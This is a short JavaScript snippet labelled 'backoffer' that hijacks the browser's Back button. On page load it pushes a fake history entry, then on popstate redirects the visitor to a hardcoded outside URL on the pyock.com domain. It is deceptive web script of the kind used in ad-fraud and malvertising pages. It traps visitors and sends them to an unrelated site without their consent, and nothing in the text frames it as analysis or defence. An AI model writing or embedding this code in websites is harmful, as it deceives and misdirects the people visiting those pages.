/* backoffer */
window.backOfferUrl = 'http://x.pyock.com/kssBK3';
(function(w, d){
  var targetLocation = function() {
    var url = '';
    if (w.backOfferUrl) {
      url = w.backOfferUrl
    }
    else {
      return;
    }
    w.history && w.history.pushState && w.history.pushState(null, null, w.location);
    w.addEventListener && w.addEventListener('popstate' , function() {
      w.location = url;
    }
                                              , !1);
  };
  (function() {
    setTimeout(targetLocation, 0);
  }
   ());
}
 (window, document));
